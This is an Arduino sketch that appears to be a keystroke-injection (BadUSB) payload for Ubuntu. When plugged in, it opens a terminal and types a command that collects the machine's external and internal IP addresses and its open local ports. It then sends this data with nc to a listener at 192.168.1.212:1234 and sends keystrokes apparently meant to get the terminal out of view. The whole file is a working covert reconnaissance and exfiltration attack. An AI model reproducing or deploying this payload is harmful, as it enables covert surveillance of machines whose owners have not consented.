// Title: Ubuntu ip's e portas
// Author: Rennan Cockles

#include <Keyboard.h>

Keyboard kb;


void setup()
{  
    Serial.begin(9600);  
    delay(1000);
    
    kb.ALT_F2();
    kb.DELAY(500);
    kb.STRING("gnome-terminal");
    kb.ENTER();
    kb.DELAY(1500);
    kb.STRING("echo -e \"ip_externo: $(curl -s ifconfig.co) \\nip_interno: $(ifconfig | grep Bcast | tr -s ' ' | cut -d' ' -f4)$( [ -e /usr/bin/nmap ] && echo \"\\nportas: $(nmap 127.0.0.1 | grep open | cut -d ' ' -f1 | cut -d'/' -f1 | tr '\\n' ' ')\")\" | nc 192.168.1.212 1234");
    kb.ENTER();
    kb.DELAY(1000);
    kb.ALT_SPACE();
    kb.DELAY(500);
    kb.STRING("f");
}


void loop()
{
}



